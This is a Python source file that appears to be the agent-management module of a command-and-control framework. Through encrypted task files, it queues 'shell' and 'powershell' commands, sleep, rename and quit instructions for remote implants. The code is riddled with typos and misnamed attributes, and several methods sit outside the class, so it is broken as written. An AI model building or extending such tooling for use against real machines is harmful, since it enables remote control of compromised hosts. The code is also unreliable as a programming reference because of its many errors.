import menu
import os

import time
from shutil import rmtree

from common import *
from encryption import *

class Agent:
    def __init__(self, name, listener, remoteip, hostname, Type, key):
        self.name = name
        self.listener = listener
        self.remoteip = remoteip
        self.hostname = hostname
        self.Type = Type
        self.key = key
        self.sleept = 3
        self.Path = "data/listeners/{}/agents/{}/".formate(self.listener, self.name)
        self.tasksPath = "{}tasks".format(self.Path, self.name)

        if os.path.exists(self.Path) == False:
            os.mkdir(self.Path)
        
        self.menu = menu.Menu(self.name)

        self.menu.registerCommand("shell", "execute a shell command", "<command>")
        self.menu.registerCommand("powershell", "execute a powershell command", "<time (s)>")
        self.menu.registerCommand("clear", "Clear tasks", "")
        self.menu.registerCOmmand("quit", "Tas agent to quit", "")

        self.menu.uCommands()

        self.Commands = self.menu.Commands
    
    def writeTask(self, task):
        if self.Type == "p":
            task = "VALID " + task
            task = ENCRYPT(task, self.key)
        elif self.Type == "w":
            task = task 
        
        with open (self.tasksPath, "w") as f:
            f.write(task)
        
    
    def clearTasks(self):
        if os.path.exists(self.tasksPath):
            os.remove(self.tasksPath)
        else:
            pass
    
    def update(self):
        self.menu.name = self.name
        self.Path = "data/listeneres/{}/agents/{}/".format(self.listener, self.name)
        self.tasksPath = "{}tasks".format(self.PAth, self.name)

        if os.path.exists(self.Path) == False:
            os.mkdir(self.Path)
        
    def rename(self, newname):
        task = "rename " + newname
        self.writeTaks(task)

        progress("Waiting for agent")

        while os.path.exists(self.Path) == False:
            pass
        
        return 0
    
    def shell(self, args):
        if len(args) == 0:
            error("Missing command")
        else:
            command = " ".join(args)
            task = "shell " + command
            self.writeTask(task)
        
    def powershell(self, args):
        if len(args) == 0:
            error("Missing Command")
        else :
            command = " ".join(args)
            task = "powershell " + command
            self.writeTks(task)
        
    def sleep(self, args):
        if (len(args)) != 1:
            error("invalid arguments")
        else:
            time =args[0]
            try:
                temp = int(time)
            except:
                error("invalid time")
                return 0
            
            task = "sleep {}".format(time)
            self.writeTask(task)
            self.sleept = int(time)
            removeFromDatabase(agentsDB, self.name)
            writeToDatabase(agentsDB, self)
        
def QuitandRemove(self):
    self.Quit()

    rmtree(self.Path)
    removeFromDatabase(agentsDB, self.name)

    menu.home()

    return 0

def Quit(self):
    self.writeTask("quit")
    progress("Waiting for agent")

    for i in range(self.sleept):
        if os.path.exists(self.tasksPth):
            time.sleep(1)
        else:
            break 
    return 0

def ev(self, command, args):
    if command == "help":
        self.menu.showHelp()
    elif command == "home":
        menu.home()
    elif command == "shell":
        self.shell(args)
    elif command == "exit":
        menu.Exit()
    elif command == "powershell":
        self.powershell(args)
    elif command == "clear":
        self.clearTasks()
    elif command == "quit":
        self.QuitandRemove()

def interact(Self):
    self.menu.clearScreen()
    while True:
        try:
            command, args = self.menu.parse()
        except :
            continue
        
        if command not in self.Commands:
            error("Invalid command")
        else:
             self.ev(command, args)
                
        
    


